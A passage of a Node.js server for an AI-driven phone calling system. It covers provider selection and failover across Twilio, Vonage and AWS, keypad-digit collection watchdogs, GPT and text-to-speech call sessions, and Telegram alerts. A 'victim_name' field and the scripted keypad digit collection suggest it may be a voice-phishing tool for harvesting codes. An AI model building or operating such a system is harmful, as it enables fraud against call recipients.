      setActive(normalized);
      console.log(
        `☎️ Loaded default ${label} provider from storage: ${normalized.toUpperCase()} (active)`,
      );
      return;
    }

    console.warn(
      `Stored ${label} provider "${normalized}" is not configured/ready in this environment. Keeping active provider "${getActive()}".`,
    );
    console.log(
      `☎️ Default ${label} provider remains: ${String(getActive() || "unknown").toUpperCase()}`,
    );
  } catch (error) {
    console.error(`Failed to load stored ${label} provider:`, error);
  } finally {
    syncRuntimeProviderMirrors();
  }
}

async function loadStoredCallProvider() {
  await loadStoredProviderSetting({
    channel: PROVIDER_CHANNELS.CALL,
    settingKey: CALL_PROVIDER_SETTING_KEY,
    label: "call",
    supportedProviders: SUPPORTED_CALL_PROVIDERS,
    getReadiness: getProviderReadiness,
    getActive: getActiveCallProvider,
    setActive: setActiveCallProvider,
    setStored: setStoredCallProvider,
  });
}

async function loadStoredSmsProvider() {
  await loadStoredProviderSetting({
    channel: PROVIDER_CHANNELS.SMS,
    settingKey: SMS_PROVIDER_SETTING_KEY,
    label: "sms",
    supportedProviders: SUPPORTED_SMS_PROVIDERS,
    getReadiness: getSmsProviderReadiness,
    getActive: getActiveSmsProvider,
    setActive: setActiveSmsProvider,
    setStored: setStoredSmsProvider,
  });
}

async function loadStoredEmailProvider() {
  await loadStoredProviderSetting({
    channel: PROVIDER_CHANNELS.EMAIL,
    settingKey: EMAIL_PROVIDER_SETTING_KEY,
    label: "email",
    supportedProviders: SUPPORTED_EMAIL_PROVIDERS,
    getReadiness: getEmailProviderReadiness,
    getActive: getActiveEmailProvider,
    setActive: setActiveEmailProvider,
    setStored: setStoredEmailProvider,
  });
}

async function persistKeypadProviderOverrides() {
  if (!db?.setSetting) return;
  try {
    await db.setSetting(
      KEYPAD_PROVIDER_OVERRIDE_SETTING_KEY,
      JSON.stringify(serializeKeypadProviderOverrides()),
    );
  } catch (error) {
    console.error("Failed to persist keypad provider overrides:", error);
  }
}

async function loadKeypadProviderOverrides() {
  keypadProviderOverrides.clear();
  if (!db?.getSetting) return;
  try {
    const raw = await db.getSetting(KEYPAD_PROVIDER_OVERRIDE_SETTING_KEY);
    if (!raw) return;
    const parsed = JSON.parse(raw);
    const overrides = Array.isArray(parsed?.overrides) ? parsed.overrides : [];
    const nowMs = Date.now();
    for (const item of overrides) {
      const scopeKey = String(item?.scopeKey || "").trim();
      const provider = String(item?.provider || "").trim().toLowerCase();
      const expiresAt = Number(item?.expiresAt || 0);
      if (!scopeKey || !provider || !Number.isFinite(expiresAt)) continue;
      if (expiresAt <= nowMs) continue;
      keypadProviderOverrides.set(scopeKey, {
        provider,
        expiresAt,
        createdAt: item?.createdAt || null,
        reason: item?.reason || null,
        script_id: item?.script_id || null,
        collection_profile: item?.collection_profile || null,
        source_call_sid: item?.source_call_sid || null,
      });
    }
  } catch (error) {
    console.error("Failed to load keypad provider overrides:", error);
  }
}

function resolveKeypadProviderOverride(
  collectionProfile,
  scriptPolicy = {},
  scriptId = null,
) {
  const changed = pruneExpiredKeypadProviderOverrides();
  if (changed) {
    persistKeypadProviderOverrides().catch(() => {});
  }
  const scopeKeys = buildKeypadScopeKeys(collectionProfile, scriptPolicy, scriptId);
  for (const scope of scopeKeys) {
    const override = keypadProviderOverrides.get(scope.key);
    if (!override) continue;
    return {
      ...override,
      scopeKey: scope.key,
      scope: scope.scope,
      scopeValue: scope.value,
    };
  }
  return null;
}

function clearKeypadDtmfWatchdog(callSid) {
  if (!callSid) return;
  const existing = keypadDtmfWatchdogs.get(callSid);
  if (existing) {
    clearTimeout(existing);
    keypadDtmfWatchdogs.delete(callSid);
  }
}

function clearKeypadCallState(callSid) {
  if (!callSid) return;
  clearKeypadDtmfWatchdog(callSid);
  keypadDtmfSeen.delete(callSid);
}

function markKeypadDtmfSeen(callSid, meta = {}) {
  if (!callSid) return;
  keypadDtmfSeen.set(callSid, {
    seenAt: new Date().toISOString(),
    source: meta?.source || null,
    digitsLength: Number(meta?.digitsLength || 0) || null,
  });
  clearKeypadDtmfWatchdog(callSid);
}

async function triggerVonageKeypadGuard(callSid, callConfig, timeoutMs) {
  if (!callSid || !callConfig) return;
  const scopeKeys = buildKeypadScopeKeys(
    callConfig.collection_profile,
    callConfig.script_policy || {},
    callConfig.script_id,
  );
  if (!scopeKeys.length) return;

  const cooldownMs = Number(config.keypadGuard?.providerOverrideCooldownMs) || 1800000;
  const nowMs = Date.now();
  const expiresAt = nowMs + cooldownMs;
  const createdAt = new Date(nowMs).toISOString();
  const profile =
    normalizeDigitProfile(
      callConfig.collection_profile || callConfig.script_policy?.default_profile,
    ) || null;
  const scriptId = normalizeScriptId(callConfig.script_id);

  for (const scope of scopeKeys) {
    keypadProviderOverrides.set(scope.key, {
      provider: "twilio",
      expiresAt,
      createdAt,
      reason: "vonage_dtmf_timeout",
      script_id: scriptId,
      collection_profile: profile,
      source_call_sid: callSid,
    });
  }

  await persistKeypadProviderOverrides();

  const remainingMinutes = Math.max(1, Math.ceil(cooldownMs / 60000));
  const alertMessage = `⚠️ Provider guard: no keypad DTMF detected on Vonage within ${Math.round(
    timeoutMs / 1000,
  )}s for call ${callSid.slice(-6)}. Future keypad flows for ${scopeKeys
    .map((s) => s.key)
    .join(", ")} will route to TWILIO for ${remainingMinutes}m.`;

  webhookService.addLiveEvent(callSid, alertMessage, { force: true });
  if (db?.updateCallState) {
    await db
      .updateCallState(callSid, "keypad_provider_override_triggered", {
        at: createdAt,
        provider: "vonage",
        fallback_provider: "twilio",
        timeout_ms: timeoutMs,
        override_scope_keys: scopeKeys.map((s) => s.key),
        override_expires_at: new Date(expiresAt).toISOString(),
      })
      .catch(() => {});
  }
  db?.addCallMetric?.(callSid, "keypad_dtmf_timeout_ms", timeoutMs, {
    provider: "vonage",
    scope_keys: scopeKeys.map((s) => s.key),
    override_provider: "twilio",
  }).catch(() => {});
  db?.logServiceHealth?.("provider_guard", "keypad_timeout", {
    call_sid: callSid,
    provider: "vonage",
    timeout_ms: timeoutMs,
    override_provider: "twilio",
    scope_keys: scopeKeys.map((s) => s.key),
    override_expires_at: new Date(expiresAt).toISOString(),
  }).catch(() => {});

  const alertChatId = callConfig.user_chat_id || config.telegram?.adminChatId || null;
  if (alertChatId && webhookService?.sendTelegramMessage) {
    webhookService
      .sendTelegramMessage(alertChatId, alertMessage)
      .catch((error) =>
        console.error("Failed to send keypad guard alert to Telegram:", error),
      );
  }
}

function scheduleVonageKeypadDtmfWatchdog(callSid, callConfig) {
  clearKeypadDtmfWatchdog(callSid);
  if (!callSid || !callConfig) return;
  if (!config.keypadGuard?.enabled) return;
  if (String(callConfig.provider || "").toLowerCase() !== "vonage") return;
  if (!isKeypadRequiredFlow(callConfig.collection_profile, callConfig.script_policy)) {
    return;
  }
  const timeoutMs = Number(config.keypadGuard?.vonageDtmfTimeoutMs) || 12000;
  if (!Number.isFinite(timeoutMs) || timeoutMs <= 0) return;

  const timer = setTimeout(() => {
    keypadDtmfWatchdogs.delete(callSid);
    if (keypadDtmfSeen.has(callSid)) return;
    triggerVonageKeypadGuard(callSid, callConfig, timeoutMs).catch((error) => {
      console.error("Vonage keypad guard trigger failed:", error);
    });
  }, timeoutMs);
  keypadDtmfWatchdogs.set(callSid, timer);
}

function getProviderReadiness() {
  const vonageHasCredentials = !!(
    config.vonage.apiKey &&
    config.vonage.apiSecret &&
    config.vonage.applicationId &&
    config.vonage.privateKey &&
    config.vonage.voice?.fromNumber
  );
  const vonageHasRouting = !!(
    config.server?.hostname ||
    config.vonage.voice?.answerUrl ||
    config.vonage.voice?.eventUrl
  );
  const vonageWebhookMode = String(
    config.vonage?.webhookValidation || "warn",
  ).toLowerCase();
  const vonageWebhookReady =
    vonageWebhookMode !== "strict" ||
    Boolean(config.vonage?.webhookSignatureSecret);
  if (
    vonageHasCredentials &&
    vonageHasRouting &&
    !vonageWebhookReady &&
    !warnedVonageWebhookValidation
  ) {
    console.warn(
      "⚠️ Vonage webhook validation is strict but VONAGE_WEBHOOK_SIGNATURE_SECRET is missing. Vonage callbacks will fail until configured.",
    );
    warnedVonageWebhookValidation = true;
  }
  return {
    twilio: !!(
      config.twilio.accountSid &&
      config.twilio.authToken &&
      config.twilio.fromNumber
    ),
    aws: !!(config.aws.connect.instanceId && config.aws.connect.contactFlowId),
    vonage: vonageHasCredentials && vonageHasRouting && vonageWebhookReady,
  };
}

function getSmsProviderReadiness() {
  if (smsService?.getProviderReadiness) {
    return smsService.getProviderReadiness();
  }
  return {
    twilio: !!(
      config.twilio?.accountSid &&
      config.twilio?.authToken &&
      config.twilio?.fromNumber
    ),
    aws: !!(
      config.aws?.pinpoint?.applicationId &&
      config.aws?.pinpoint?.originationNumber &&
      config.aws?.pinpoint?.region
    ),
    vonage: !!(
      config.vonage?.apiKey &&
      config.vonage?.apiSecret &&
      config.vonage?.sms?.fromNumber
    ),
  };
}

function getEmailProviderReadiness() {
  if (emailService?.getProviderReadiness) {
    return emailService.getProviderReadiness();
  }
  return {
    sendgrid: !!config.email?.sendgrid?.apiKey,
    mailgun: !!(config.email?.mailgun?.apiKey && config.email?.mailgun?.domain),
    ses: !!(
      config.email?.ses?.region &&
      config.email?.ses?.accessKeyId &&
      config.email?.ses?.secretAccessKey
    ),
  };
}

function getProviderHealthEntry(provider) {
  if (!providerHealth.has(provider)) {
    providerHealth.set(provider, {
      errorTimestamps: [],
      degradedUntil: 0,
      lastErrorAt: null,
      lastSuccessAt: null,
    });
  }
  return providerHealth.get(provider);
}

function recordProviderError(provider, error) {
  const health = getProviderHealthEntry(provider);
  const windowMs = Number(config.providerFailover?.errorWindowMs) || 120000;
  const threshold = Number(config.providerFailover?.errorThreshold) || 3;
  const cooldownMs = Number(config.providerFailover?.cooldownMs) || 300000;
  const now = Date.now();
  health.errorTimestamps = health.errorTimestamps.filter(
    (ts) => now - ts <= windowMs,
  );
  health.errorTimestamps.push(now);
  health.lastErrorAt = new Date().toISOString();
  if (health.errorTimestamps.length >= threshold) {
    health.degradedUntil = now + cooldownMs;
    db?.logServiceHealth?.("provider_failover", "degraded", {
      provider,
      errors: health.errorTimestamps.length,
      window_ms: windowMs,
      cooldown_ms: cooldownMs,
      error: error?.message || String(error || "unknown"),
    }).catch(() => {});
  }
  providerHealth.set(provider, health);
}

function recordProviderSuccess(provider) {
  const health = getProviderHealthEntry(provider);
  health.errorTimestamps = [];
  health.lastSuccessAt = new Date().toISOString();
  if (health.degradedUntil && Date.now() > health.degradedUntil) {
    health.degradedUntil = 0;
  }
  providerHealth.set(provider, health);
}

function isProviderDegraded(provider) {
  const health = getProviderHealthEntry(provider);
  if (!health.degradedUntil) return false;
  if (Date.now() > health.degradedUntil) {
    health.degradedUntil = 0;
    providerHealth.set(provider, health);
    return false;
  }
  return true;
}

function getProviderOrder(preferred) {
  const order = [];
  if (preferred) order.push(preferred);
  for (const provider of SUPPORTED_PROVIDERS) {
    if (!order.includes(provider)) order.push(provider);
  }
  return order;
}

function selectOutboundProvider(preferred) {
  const readiness = getProviderReadiness();
  const failoverEnabled = config.providerFailover?.enabled !== false;
  const order = getProviderOrder(preferred);
  for (const provider of order) {
    if (!readiness[provider]) continue;
    if (!failoverEnabled) return provider;
    if (!isProviderDegraded(provider)) return provider;
  }
  return null;
}

let warnedMachineDetection = false;
let warnedVonageWebhookValidation = false;
function isMachineDetectionEnabled() {
  const value = String(config.twilio?.machineDetection || "").toLowerCase();
  if (!value) return false;
  if (["disable", "disabled", "off", "false", "0", "none"].includes(value))
    return false;
  return true;
}

function warnIfMachineDetectionDisabled(context = "") {
  if (warnedMachineDetection) return;
  if (currentProvider !== "twilio") return;
  if (isMachineDetectionEnabled()) return;
  const suffix = context ? ` (${context})` : "";
  console.warn(
    `⚠️ Twilio AMD is not enabled${suffix}. Voicemail detection may be unreliable. Set TWILIO_MACHINE_DETECTION=Enable.`,
  );
  warnedMachineDetection = true;
}

function getAwsConnectAdapter() {
  if (!awsConnectAdapter) {
    awsConnectAdapter = new AwsConnectAdapter(config.aws);
  }
  return awsConnectAdapter;
}

function getVonageVoiceAdapter() {
  if (!vonageVoiceAdapter) {
    vonageVoiceAdapter = new VonageVoiceAdapter(config.vonage);
  }
  return vonageVoiceAdapter;
}

function getAwsTtsAdapter() {
  if (!awsTtsAdapter) {
    awsTtsAdapter = new AwsTtsAdapter(config.aws);
  }
  return awsTtsAdapter;
}

async function endCallForProvider(callSid) {
  const callConfig = callConfigurations.get(callSid);
  const provider = callConfig?.provider || currentProvider;

  if (provider === "twilio") {
    const accountSid = config.twilio.accountSid;
    const authToken = config.twilio.authToken;
    if (!accountSid || !authToken) {
      throw new Error("Twilio credentials not configured");
    }
    const client = twilio(accountSid, authToken);
    await client.calls(callSid).update({ status: "completed" });
    return;
  }

  if (provider === "aws") {
    const contactId = callConfig?.provider_metadata?.contact_id;
    if (!contactId) {
      throw new Error("AWS contact id not available");
    }
    const awsAdapter = getAwsConnectAdapter();
    await awsAdapter.stopContact({ contactId });
    return;
  }

  if (provider === "vonage") {
    const callUuid = resolveVonageHangupUuid(callSid, callConfig);
    if (!callUuid) {
      throw new Error(
        "Vonage call UUID not available for hangup; ensure event webhook mapping is configured",
      );
    }
    const vonageAdapter = getVonageVoiceAdapter();
    await vonageAdapter.hangupCall(callUuid);
    return;
  }

  throw new Error(`Unsupported provider ${provider}`);
}

async function connectInboundCall(callSid, hostOverride = null) {
  const callConfig = callConfigurations.get(callSid);
  const provider = callConfig?.provider || currentProvider;
  if (provider !== "twilio") {
    throw new Error("Inbound answer is only supported for Twilio");
  }
  const host = hostOverride || config.server?.hostname;
  if (!host) {
    throw new Error("Server hostname not configured");
  }
  const accountSid = config.twilio.accountSid;
  const authToken = config.twilio.authToken;
  if (!accountSid || !authToken) {
    throw new Error("Twilio credentials not configured");
  }
  const client = twilio(accountSid, authToken);
  const url = `https://${host}/incoming?answer=1`;
  await client.calls(callSid).update({ url, method: "POST" });
}

function estimateSpeechDurationMs(text = "") {
  const words = String(text || "")
    .trim()
    .split(/\s+/)
    .filter(Boolean).length;
  const baseMs = 1200;
  const perWordMs = 420;
  const estimated = baseMs + words * perWordMs;
  return Math.max(1600, Math.min(12000, estimated));
}

function startBackgroundWorkers() {
  if (backgroundWorkersStarted) return;
  backgroundWorkersStarted = true;

  setInterval(() => {
    smsService.processScheduledMessages().catch((error) => {
      console.error("❌ Scheduled SMS processing error:", error);
    });
  }, 60000); // Check every minute

  setInterval(() => {
    processCallJobs().catch((error) => {
      console.error("❌ Call job processor error:", error);
    });
  }, config.callJobs?.intervalMs || 5000);

  processCallJobs().catch((error) => {
    console.error("❌ Initial call job processor error:", error);
  });

  setInterval(() => {
    runStreamWatchdog().catch((error) => {
      console.error("❌ Stream watchdog error:", error);
    });
  }, STREAM_WATCHDOG_INTERVAL_MS);

  setInterval(() => {
    if (!emailService) {
      return;
    }
    emailService.processQueue({ limit: 10 }).catch((error) => {
      console.error("❌ Email queue processing error:", error);
    });
  }, config.email?.queueIntervalMs || 5000);

  setInterval(
    () => {
      smsService.cleanupOldConversations(24); // Keep conversations for 24 hours
    },
    60 * 60 * 1000,
  );
}

async function speakAndEndCall(callSid, message, reason = "completed") {
  if (!callSid || callEndLocks.has(callSid)) {
    return;
  }
  callEndLocks.set(callSid, true);
  clearSilenceTimer(callSid);
  if (digitService) {
    digitService.clearCallState(callSid);
  }

  const text = message || "Thank you for your time. Goodbye.";
  const callConfig = callConfigurations.get(callSid);
  const provider = callConfig?.provider || currentProvider;
  const session = activeCalls.get(callSid);
  if (session) {
    session.ending = true;
  }

  webhookService.addLiveEvent(callSid, `👋 Ending call (${reason})`, {
    force: true,
  });
  webhookService.setLiveCallPhase(callSid, "ending").catch(() => {});

  try {
    await db.addTranscript({
      call_sid: callSid,
      speaker: "ai",
      message: text,
      interaction_count: session?.interactionCount || 0,
      personality_used: "closing",
    });
    webhookService.recordTranscriptTurn(callSid, "agent", text);
  } catch (dbError) {
    console.error("Database error adding closing transcript:", dbError);
  }

  try {
    await db.updateCallState(callSid, "call_ending", {
      reason,
      message: text,
    });
  } catch (stateError) {
    console.error("Database error logging call ending:", stateError);
  }

  const delayMs = estimateSpeechDurationMs(text);

  if (provider === "aws") {
    try {
      const ttsAdapter = getAwsTtsAdapter();
      const voiceId = resolveVoiceModel(callConfig);
      const { key } = await ttsAdapter.synthesizeToS3(
        text,
        voiceId ? { voiceId } : {},
      );
      const contactId = callConfig?.provider_metadata?.contact_id;
      if (contactId) {
        const awsAdapter = getAwsConnectAdapter();
        await awsAdapter.enqueueAudioPlayback({ contactId, audioKey: key });
      }
      scheduleSpeechTicks(
        callSid,
        "agent_speaking",
        estimateSpeechDurationMs(text),
        0.5,
      );
    } catch (ttsError) {
      console.error("AWS closing TTS error:", ttsError);
    }
    setTimeout(() => {
      endCallForProvider(callSid).catch((err) =>
        console.error("End call error:", err),
      );
    }, delayMs);
    return;
  }

  if (provider === "twilio" && !session?.ttsService) {
    try {
      const accountSid = config.twilio.accountSid;
      const authToken = config.twilio.authToken;
      if (accountSid && authToken) {
        const response = new VoiceResponse();
        const sayVoice = resolveTwilioSayVoice(callConfig);
        if (sayVoice) {
          response.say({ voice: sayVoice }, text);
        } else {
          response.say(text);
        }
        response.hangup();
        const client = twilio(accountSid, authToken);
        await client.calls(callSid).update({ twiml: response.toString() });
        return;
      }
    } catch (twilioError) {
      console.error("Twilio closing update error:", twilioError);
    }
  }

  if (session?.ttsService) {
    try {
      await session.ttsService.generate(
        { partialResponseIndex: null, partialResponse: text },
        session?.interactionCount || 0,
      );
    } catch (ttsError) {
      console.error("Closing TTS error:", ttsError);
    }
  }

  setTimeout(() => {
    endCallForProvider(callSid).catch((err) =>
      console.error("End call error:", err),
    );
  }, delayMs);
}

async function recordCallStatus(callSid, status, notificationType, extra = {}) {
  if (!callSid) return;
  const call = await db.getCall(callSid).catch(() => null);
  const previousStatus = call?.status || call?.twilio_status;
  const normalizedStatus = normalizeCallStatus(status);
  const applyStatus = shouldApplyStatusUpdate(
    previousStatus,
    normalizedStatus,
    {
      allowTerminalUpgrade: normalizedStatus === "completed",
    },
  );
  const finalStatus = applyStatus
    ? normalizedStatus
    : normalizeCallStatus(previousStatus || normalizedStatus);
  await db.updateCallStatus(callSid, finalStatus, extra);
  if (applyStatus) {
    recordCallLifecycle(callSid, finalStatus, {
      source: "internal",
      raw_status: status,
      duration: extra?.duration,
    });
    if (isTerminalStatusKey(finalStatus)) {
      scheduleCallLifecycleCleanup(callSid);
    }
  }
  if (call?.user_chat_id && notificationType && applyStatus) {
    await db.createEnhancedWebhookNotification(
      callSid,
      notificationType,
      call.user_chat_id,
    );
  }
}

async function ensureAwsSession(callSid) {
  if (activeCalls.has(callSid)) {
    return activeCalls.get(callSid);
  }

  const callConfig = callConfigurations.get(callSid);
  const functionSystem = callFunctionSystems.get(callSid);
  if (!callConfig) {
    throw new Error(`Missing call configuration for ${callSid}`);
  }

  let gptService;
  if (functionSystem) {
    gptService = new EnhancedGptService(
      callConfig.prompt,
      callConfig.first_message,
    );
  } else {
    gptService = new EnhancedGptService(
      callConfig.prompt,
      callConfig.first_message,
    );
  }

  gptService.setCallSid(callSid);
  gptService.setCustomerName(
    callConfig?.customer_name || callConfig?.victim_name,
  );
  gptService.setCallProfile(
    callConfig?.purpose || callConfig?.business_context?.purpose,
  );
  const intentLine = `Call intent: ${callConfig?.script || "general"} | purpose: ${callConfig?.purpose || "general"} | business: ${callConfig?.business_context?.business_id || callConfig?.business_id || "unspecified"}. Keep replies concise and on-task.`;
  gptService.setCallIntent(intentLine);
  await applyInitialDigitIntent(callSid, callConfig, gptService, 0);
  configureCallTools(gptService, callSid, callConfig, functionSystem);

  const session = {
    startTime: new Date(),
    transcripts: [],
    gptService,
    callConfig,
    functionSystem,
    personalityChanges: [],
    interactionCount: 0,
  };

  gptService.on("gptreply", async (gptReply, icount) => {
    if (session?.ending) {
      return;
    }
    const personalityInfo = gptReply.personalityInfo || {};

    webhookService.recordTranscriptTurn(
      callSid,
      "agent",
      gptReply.partialResponse,
    );
    webhookService
      .setLiveCallPhase(callSid, "agent_responding")
      .catch(() => {});

    try {
      await db.addTranscript({
        call_sid: callSid,
        speaker: "ai",
        message: gptReply.partialResponse,
        interaction_count: icount,
        personality_used: personalityInfo.name || "default",
        adaptation_data: JSON.stringify(gptReply.adaptationHistory || []),
      });

      await db.updateCallState(callSid, "ai_responded", {
        message: gptReply.partialResponse,
        interaction_count: icount,
        personality: personalityInfo.name,
      });
    } catch (dbError) {
      console.error("Database error adding AI transcript:", dbError);
    }

    try {
      const ttsAdapter = getAwsTtsAdapter();
      const voiceId = resolveVoiceModel(callConfig);
      const { key } = await ttsAdapter.synthesizeToS3(
        gptReply.partialResponse,
        voiceId ? { voiceId } : {},
      );
      const contactId = callConfig?.provider_metadata?.contact_id;
      if (contactId) {
        const awsAdapter = getAwsConnectAdapter();
        await awsAdapter.enqueueAudioPlayback({
          contactId,
          audioKey: key,
        });
        webhookService
          .setLiveCallPhase(callSid, "agent_speaking")
          .catch(() => {});
        scheduleSpeechTicks(
          callSid,
          "agent_speaking",
          estimateSpeechDurationMs(gptReply.partialResponse),
          0.55,
        );
        scheduleSilenceTimer(callSid);
      }
    } catch (ttsError) {
      console.error("AWS TTS playback error:", ttsError);
    }
  });

  activeCalls.set(callSid, session);

  try {
    const initialExpectation = digitService?.getExpectation(callSid);
    const firstMessage =
      callConfig.first_message ||
      (initialExpectation
        ? digitService.buildDigitPrompt(initialExpectation)
        : "Hello!");
    const ttsAdapter = getAwsTtsAdapter();
    const voiceId = resolveVoiceModel(callConfig);
    const { key } = await ttsAdapter.synthesizeToS3(
      firstMessage,
      voiceId ? { voiceId } : {},
    );
    const contactId = callConfig?.provider_metadata?.contact_id;
    if (contactId) {
      const awsAdapter = getAwsConnectAdapter();
      await awsAdapter.enqueueAudioPlayback({
        contactId,
        audioKey: key,
      });
      webhookService.recordTranscriptTurn(callSid, "agent", firstMessage);
      webhookService
        .setLiveCallPhase(callSid, "agent_speaking")
        .catch(() => {});
      scheduleSpeechTicks(
        callSid,
        "agent_speaking",
        estimateSpeechDurationMs(firstMessage),
        0.5,
      );
      if (digitService?.hasExpectation(callSid)) {
        digitService.markDigitPrompted(callSid, gptService, 0, "dtmf", {
          allowCallEnd: true,
          prompt_text: firstMessage,
        });
        digitService.scheduleDigitTimeout(callSid, gptService, 0);
      }
      scheduleSilenceTimer(callSid);
    }
  } catch (error) {
    console.error("AWS first message playback error:", error);
  }

  return session;
}

async function startServer(options = {}) {
  const { listen = true } = options;
  try {
    console.log("🚀 Initializing Adaptive AI Call System...");
    warnIfMachineDetectionDisabled("startup");

    // Initialize database first
    console.log("Initializing enhanced database...");
    db = new Database();
    await db.initialize();
    console.log("✅ Enhanced database initialized successfully");
    if (smsService?.setDb) {
      smsService.setDb(db);
    }
    emailService = new EmailService({
      db,
      config,
      providerResolver: () => getActiveEmailProvider(),
    });
    await loadStoredCallProvider();
    await loadStoredSmsProvider();
    await loadStoredEmailProvider();
    await refreshInboundDefaultScript(true);
    await loadKeypadProviderOverrides();
    const voiceAgentMode = resolveVoiceAgentExecutionMode();
    logStartupRuntimeProfile(voiceAgentMode);
    console.log(
      `☎️ Default call provider: ${String(storedProvider || currentProvider || "twilio").toUpperCase()} (active: ${String(currentProvider || "twilio").toUpperCase()})`,
    );
    console.log(
      `✉️ Default SMS provider: ${String(storedSmsProvider || currentSmsProvider || "twilio").toUpperCase()} (active: ${String(currentSmsProvider || "twilio").toUpperCase()})`,
    );
    console.log(
      `📧 Default email provider: ${String(storedEmailProvider || currentEmailProvider || "sendgrid").toUpperCase()} (active: ${String(currentEmailProvider || "sendgrid").toUpperCase()})`,
    );
    if (voiceAgentMode.enabled) {
      console.log("🤖 Voice agent default mode: enabled");
    } else {
      console.log(
        `🤖 Voice agent default mode: legacy STT+GPT+TTS fallback (${voiceAgentMode.reason})`,
      );
    }

    // Start webhook service after database is ready
    console.log("Starting enhanced webhook service...");
    webhookService.start(db);
    console.log("✅ Enhanced webhook service started");

    digitService = createDigitCollectionService({
      db,
      webhookService,
      callConfigurations,
      config,
      twilioClient: twilio,
      VoiceResponse,
      getCurrentProvider: () => currentProvider,
      speakAndEndCall,
      clearSilenceTimer,
      queuePendingDigitAction,
      callEndMessages: CALL_END_MESSAGES,
      closingMessage: CLOSING_MESSAGE,
      settings: DIGIT_SETTINGS,
      smsService,
      healthProvider: getDigitSystemHealth,
    });

    // Initialize function engine
    console.log("✅ Dynamic Function Engine ready");

    startBackgroundWorkers();

    // Start HTTP server
    if (listen) {
      app.listen(PORT, () => {
        console.log(`✅ Enhanced Adaptive API server running on port ${PORT}`);
        console.log(
          `🎭 System ready - Personality Engine & Dynamic Functions active`,
        );
        console.log(`📡 Enhanced webhook notifications enabled`);
        console.log(
          `📞 Twilio Media Stream track mode: ${TWILIO_STREAM_TRACK}`,
        );
      });
    }
  } catch (error) {
    console.error("❌ Failed to start server:", error);
    process.exit(1);
  }
}

function buildVoiceAgentFunctions(functionSystem = null) {
  if (!functionSystem || !Array.isArray(functionSystem.functions)) {
    return [];
  }
  return functionSystem.functions
    .map((tool) => {
      const fn = tool?.function || {};
      if (!fn.name) return null;
      return {
        name: fn.name,
        description: fn.description,
        parameters: fn.parameters,
      };
    })
    .filter(Boolean);
}

function resolveVoiceAgentExecutionMode() {
  const requested = config.deepgram?.voiceAgent?.enabled === true;
  if (!requested) {
    return {
      requested: false,
      enabled: false,
      reason: "disabled_by_config",
    };
  }
  if (!config.deepgram?.apiKey) {
    return {
      requested: true,
      enabled: false,
      reason: "missing_deepgram_api_key",
    };
  }
  if (!String(config.deepgram?.voiceAgent?.endpoint || "").trim()) {
    return {
      requested: true,
      enabled: false,
      reason: "missing_voice_agent_endpoint",
    };
  }
  return {
    requested: true,
    enabled: true,
    reason: "configured",
  };
}

function logStartupRuntimeProfile(voiceAgentMode) {
  const envCallProvider = String(config.platform?.provider || "twilio").toLowerCase();
  const envSmsProvider = String(
    config.sms?.provider || config.platform?.provider || "twilio",
  ).toLowerCase();
  const envEmailProvider = String(config.email?.provider || "sendgrid").toLowerCase();
  const payload = {
    type: "startup_runtime_profile",
    timestamp: new Date().toISOString(),
    provider: {
      call: {
        env_default: envCallProvider,
        stored_default: storedProvider ? String(storedProvider).toLowerCase() : null,
        effective_default:
          (storedProvider ? String(storedProvider).toLowerCase() : null) ||
          envCallProvider,
        active: String(currentProvider || "twilio").toLowerCase(),
      },
      sms: {
        env_default: envSmsProvider,
        stored_default: storedSmsProvider
          ? String(storedSmsProvider).toLowerCase()
          : null,
        effective_default:
          (storedSmsProvider ? String(storedSmsProvider).toLowerCase() : null) ||
          envSmsProvider,
        active: String(currentSmsProvider || "twilio").toLowerCase(),
      },
      email: {
        env_default: envEmailProvider,
        stored_default: storedEmailProvider
          ? String(storedEmailProvider).toLowerCase()
          : null,
        effective_default:
          (storedEmailProvider ? String(storedEmailProvider).toLowerCase() : null) ||
          envEmailProvider,
        active: String(currentEmailProvider || "sendgrid").toLowerCase(),
      },
    },
    voice_agent: {
      requested: Boolean(voiceAgentMode?.requested),
      enabled: Boolean(voiceAgentMode?.enabled),
      reason: String(voiceAgentMode?.reason || "unknown"),
      endpoint: config.deepgram?.voiceAgent?.endpoint || null,
    },
  };
  console.log(JSON.stringify(payload));
}

async function requestVoiceAgentFallback(callSid, req, reason = "") {
  if (!callSid) {
    throw new Error("Missing callSid for voice-agent fallback");
  }
  const host = resolveHost(req) || config.server?.hostname;
  if (!host) {
    throw new Error("Server hostname not configured for voice-agent fallback");
  }
  const accountSid = config.twilio?.accountSid;
  const authToken = config.twilio?.authToken;
  if (!accountSid || !authToken) {
    throw new Error("Twilio credentials missing for voice-agent fallback");
  }
  const attemptCount = (voiceAgentFallbackAttempts.get(callSid) || 0) + 1;
  voiceAgentFallbackAttempts.set(callSid, attemptCount);

  const redirectUrl = `https://${host}/incoming?voice_agent_fallback=1&va_reason=${encodeURIComponent(reason || "connect_failed")}&va_attempt=${attemptCount}`;
  const client = twilio(accountSid, authToken);
  await client.calls(callSid).update({
    method: "POST",
    url: redirectUrl,
  });
  return { redirectUrl, attemptCount };
}

async function tryStartVonageVoiceAgentSession(options = {}) {
  const {
    ws,
    req,
    callSid,
    callConfig,
    functionSystem,
    vonageUuid = null,
    vonageAudioSpec = null,
  } = options;
  if (!ws || !callSid || !callConfig || !functionSystem || !vonageAudioSpec) {
    return { started: false, reason: "invalid_context" };
  }

  const bridge = new VoiceAgentBridge({
    apiKey: config.deepgram.apiKey,
    endpoint: config.deepgram?.voiceAgent?.endpoint,
    keepAliveMs: config.deepgram?.voiceAgent?.keepAliveMs,
    listenModel: config.deepgram?.voiceAgent?.listen?.model,
    thinkProviderType: config.deepgram?.voiceAgent?.think?.providerType,
    thinkModel: config.deepgram?.voiceAgent?.think?.model,
    speakModel: config.deepgram?.voiceAgent?.speak?.model,
  });
  const voiceAgentFunctions = buildVoiceAgentFunctions(functionSystem);

  try {
    await bridge.connect({
      callSid,
      prompt: callConfig?.prompt,
      firstMessage: callConfig?.first_message,
      voiceModel: resolveVoiceModel(callConfig),
      functions: voiceAgentFunctions,
      inputEncoding: vonageAudioSpec.sttEncoding,
      inputSampleRate: vonageAudioSpec.sampleRate,
      outputEncoding: vonageAudioSpec.ttsEncoding,
      outputSampleRate: vonageAudioSpec.sampleRate,
    });
  } catch (error) {
    try {
      await bridge.close();
    } catch (_) {}
    return { started: false, reason: "connect_failed", error };
  }

  let interactionCount = 0;
  let cleanedUp = false;
  const cleanup = async (reason = "closed") => {
    if (cleanedUp) return;
    cleanedUp = true;

    try {
      await bridge.close();
    } catch (_) {}

    clearSpeechTicks(callSid);
    clearGptQueue(callSid);
    clearNormalFlowState(callSid);
